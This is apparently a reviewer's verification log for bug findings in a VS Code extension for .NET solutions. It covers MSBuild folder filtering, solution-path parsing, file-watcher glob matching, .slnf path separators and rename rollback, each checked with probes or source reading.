**A1-09: CONFIRMED.** `Project.ts:362-363` drops `SKIP_DIRECTORIES` entries before `layoutFolder`, and `layoutFolder` only re-adds *linked* folders from the items, so an included folder inside the project cannot come back. Own probe with real MSBuild (no evaluation mock), a library with `<None Include="build\**" Pack="true" PackagePath="build" />` and files in `build/`, `packages/`, `coverage/`, `Models/`, solution made with `dotnet sln add`: MSBuild reports `build/MyLib.targets` and `packages/P.cs` as included; the project root shows `[Dependencies, Models]`, with Show All Files on as well. Severity bug stands.

**A1-10: CONFIRMED.** `_projectStructure` is only read for `.dependencies` (`Project.ts:85`, `:310-311`; grep finds no other use). Own probe, a web project with 30,000 empty files under `wwwroot/lib` (300 folders): `parseProjectFiles` 4463 ms (cold cache) and 30,604 file entries kept, `parseDependencies` alone 3 ms with the same result. Small correction: `waitForProjectInitialization` waits up to 5 s per project but all projects are awaited together (`Promise.all`), so it is a 5 s overall cap, not 5 s times the number of projects. Severity risk (performance) stands.

**A1-11: CONFIRMED.** `solutionFileParser.ts:57-61` has no per-project catch, so one throwing project line fails the whole parse (and `Solution.initialize` rethrows). Own probes: with `path` mocked to `path.win32` and solution folder `C:\repo`, `D:\libs\Ext\Ext.csproj` throws `absolute path outside solution`, and so does `c:\repo\src\Ext.csproj` (same folder, lower-case drive letter), while `C:\repo\src\Ext.csproj` and `..\shared\Ext.csproj` parse. On Linux, real `dotnet build` of a `.sln` naming `/tmp/ver1-o-.../Ext.csproj` absolutely -> `Build succeeded.`, but our parser strips the slash and resolves it to `<sln dir>/tmp/ver1-o-.../Ext.csproj` (`exists false`); `/home/someone/Ext/Ext.csproj` throws. So MSBuild accepts what we reject. Severity bug stands.

**A1-12: PARTIALLY CONFIRMED; the Windows part is REFUTED by VS Code's source, two other failure modes are confirmed by source.** Read (fetched with `curl` from `github.com/microsoft/vscode`, branch `main`): `src/vs/workbench/api/common/extHostFileSystemEventService.ts` and `src/vs/base/common/glob.ts`. For a string pattern, the extension host (a) does not start a watcher at all ("workspace is already watched by default"), (b) lower-cases pattern and `uri.fsPath` when the file system is case-insensitive, and (c) matches with `parse(pattern)`. An absolute Windows path matches none of the trivial forms and goes through `toRegExp`/`parseRegExp`, whose default branch passes every character through `escapeRegExpCharacters`, so `\` becomes a literal backslash. Running that exact `parseRegExp` code (copied out of `glob.ts`) in node: pattern `C:\Users\me\repo\App.sln` vs fsPath `c:\Users\me\repo\App.sln` -> match, same for `...\.vscode\launch.json`. So on Windows these watchers do fire for a solution inside the workspace; the `@types/vscode` note ("backslash is not valid") is advice, not what the implementation does. Confirmed instead: (1) glob metacharacters in the path break the match on every OS (`/home/me/[old]/App.sln` and `/home/me/{a}/App.sln` -> no match; `C:\Users\me\[old]\App.sln` -> no match), and (2) `excludeOutOfWorkspaceEvents = typeof globPattern === 'string'` (since VS Code 1.64): a solution opened from **outside** the workspace folders (Open Solution..., which `_getSolutionData` explicitly keeps) gets no events from this watcher on any OS, and neither from the `**/*.sln*` watcher in `extension.ts`. What would settle it fully: a Windows run (manual test) and a run with a solution outside the workspace. Fix unchanged (`new RelativePattern(Uri.file(dir), basename)`). Severity: risk, but rescoped (not Windows; bracket/brace folder names and out-of-workspace solutions).

**A1-13: CONFIRMED by MSBuild source (not run on Windows); upgrade to bug on Windows.** Read (fetched from `github.com/dotnet/msbuild`) `src/Build/Construction/Solution/SolutionFile.cs` on branch `vs18.0`, the MSBuild that ships with SDK 10.0.1xx (`dotnet msbuild -version` here: `18.0.11.42424`): filter entries are stored with `FileUtilities.FixFilePath(project.GetString())` and looked up with `FixFilePath(projectFile)`; `FixFilePath` only converts `\` to `/` on non-Windows, so on Windows a `src/Lib/Lib.csproj` entry does not equal the `.sln` path `src\Lib\Lib.csproj`, and `ValidateProjectsInSolutionFilter` throws `SolutionFilterFilterContainsProjectNotInSolution` (MSB5028). Branch `vs17.14` is the same. MSBuild fixed exactly this in PR #12730 ("Fix slnf path separator handling to support both Unix and Windows style paths", merged to `main` on 2025-11-20; `main` now uses `NormalizePathSeparatorsToForwardSlash` on both sides), but that fix is not on `vs18.0`, so Windows users of the current SDK band (and of Visual Studio 2022 / MSBuild 17.x) hit it. `unloadedProjects.ts:18` reread: it writes `/`. Writing `\` works with every MSBuild version (the reviewer's Linux run with `Lib\\Lib.csproj` succeeded, and `FixFilePath` converts it there). What would settle it completely: one `dotnet build` of such a `.slnf` on Windows with SDK 10.0.1xx. Not checked: `.slnx` with a filter (paths in `.slnx` already use `/`, so it may well match there).

**A1-14: CONFIRMED (code path), trigger still suspected; worse than described for the solution.** `Solution.dispose()` (`:1410-1432`) not only disposes watchers and emitters but also **clears `_projects`**, and `SolutionService` keeps the object (no code resets `activeSolution` on delete; `handleFileChange('deleted')` only sends an empty tree). Own probe: real `dotnet`-made solution, file deleted, `handleSolutionFileDeleted()`, file written back: the model holds **0 projects**, `getProject(Lib.csproj) -> undefined`, while the tree (built from the old `solutionFile`) still shows `Lib` with `hasChildren: true`, i.e. a project node that expands to nothing, not just a frozen tree. `Project.handleFileDeleted` reread: disposes the project and the `Solution` keeps it, as described. Whether a branch switch arrives as separate delete and create events depends on VS Code's event coalescing (not run). Severity risk stands.

**A1-15: CONFIRMED.** Own probe with a solution and projects made by real `dotnet`: with the `.sln` read-only, `renameProject(Lib, 'Core')` throws `EACCES ... open R.sln` after `Lib/Lib.csproj` has already become `Lib/Core.csproj`, and the `.sln` still names `Lib\Lib.csproj` (half-renamed, no rollback). Second probe: a `ProjectReference Include="$(SolutionDir)Lib\Lib.csproj"` stays unchanged after a successful rename. One correction: the startup launch configuration *is* moved when the renamed project was the startup project (`solutionActionService.ts:354-359`); other path-keyed state (`UnloadedProjects`, the items cache, other launch configurations) is not. Severity risk stands.

**A1-16 (sanity check only): mostly CONFIRMED, one item wrong.** Grep at HEAD: `readSolutionContent`, `writeSolutionContent`, `getSolutionStats`, `getProjectHierarchy`, `getProjectByGuid`, `getLoadedFilePaths`, `getWatchedFolders`, `getCollapsedState`, `isFolderExpanded`, `removeFolderWatcher`, `Solution.fileTree`, `getProjectPath`, `getProjectGuid`, `getProjectPaths` appear only at their definitions (`findProjectByGuid` only from the unused `getProjectPath`). `editSlnx` is **not** unused: it has 7 callers in `Solution.ts`; it is only a redundant one-line wrapper around `editSolutionText`. The leak (`removeFolderWatcher` never called) holds.
